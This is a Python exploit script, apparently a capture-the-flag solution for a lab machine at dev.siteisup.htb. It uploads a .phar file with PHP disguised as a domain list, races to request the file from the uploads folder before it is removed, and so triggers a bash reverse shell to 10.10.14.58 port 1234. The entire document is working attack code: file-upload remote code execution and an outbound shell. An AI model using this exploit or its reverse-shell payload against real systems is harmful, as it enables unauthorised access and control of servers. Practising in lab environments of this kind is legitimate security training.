import requests
import io
import threading
from bs4 import BeautifulSoup
from time import sleep

### EXPLOIT CONFIG ###
# Note no double quotes as it will break out of the PHP code. Can probably escape it if you need it.
PAYLOAD="bash -c 'sh -i >& /dev/tcp/10.10.14.58/1234 0>&1'"
######################

session = requests.Session()
session.headers.update({"Special-Dev":"only4dev"})


def getLinks():
    # Check the uploads folder for all previous directories and record it
    r = session.get("http://dev.siteisup.htb/uploads/")
    soup = BeautifulSoup(r.text, "html.parser")
    
    links = []
    for link in soup.find_all("a"):
        links.append(link.get("href"))
    
    return links 


def upload_file():
    file_content=f"""
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com
    doesnotexist1.com

    PAYLOAD OUTPUT:
    
    <?php
    $descriptorspec = [
        0 => ["pipe", "r"],   // stdin
        1 => ["pipe", "w"],   // stdout
        2 => ["pipe", "w"]    // stderr
    ];
    
    $process = proc_open("{PAYLOAD}", $descriptorspec, $pipes);
    
    if (is_resource($process)) {{
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
    
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);
    
        fclose($pipes[0]);
        proc_close($process);
    
        echo "Output: $output\n";
        echo "Error: $error\n";
    }}
    ?>
    """
    
    payload_file = io.BytesIO(file_content.encode("utf-8"))
    files = {"file":("solopie.phar", payload_file, "application/octet-stream")}
    data = { "check": "Check" }
    
    # I know this request is going to hang because it's trying to resolve the non-existent domains
    r = session.post("http://dev.siteisup.htb/?page=checker", files=files, data=data)

def execute_payload(dir_hash):
    try:
        r = session.get(f"http://dev.siteisup.htb/uploads/{dir_hash}/solopie.phar")
        print(f"Output for {dir_hash}:")
        if "PAYLOAD OUTPUT" in r.text:
            print(r.text.split("PAYLOAD OUTPUT:")[1])
        else:
            print(r.text)
    except:
        pass


if __name__ == "__main__":
    print(f"[INFO] Command payload: {PAYLOAD}")
    print("[INFO] Getting previous links")
    prev_links = getLinks()

    print("[INFO] Trigger file upload")
    upload_thread = threading.Thread(target=upload_file)
    upload_thread.daemon = True
    upload_thread.start()
    # Wait to ensure that the file is uploaded
    sleep(5)

    print("[INFO] Look for new link which has uploaded file")
    new_links = getLinks()
    new_links = list(set(new_links) - set(prev_links))

    if len(new_links) == 0:
        print("[ERR] File was not uploaded")
        exit(1)

    # Just gonna execute all the links even if there is multiple new uploads

    print("[INFO] Executing file(s)")
    for i in new_links:
        t = threading.Thread(target=execute_payload, args=(i,))
        t.daemon = True # Mark thread as daemon so it won't block won't program exists
        t.start()

    # Wait for all threads to run for at least 5 seconds
    sleep(5)
    print("[SUCCESS] Payload executed. Hopefully...")
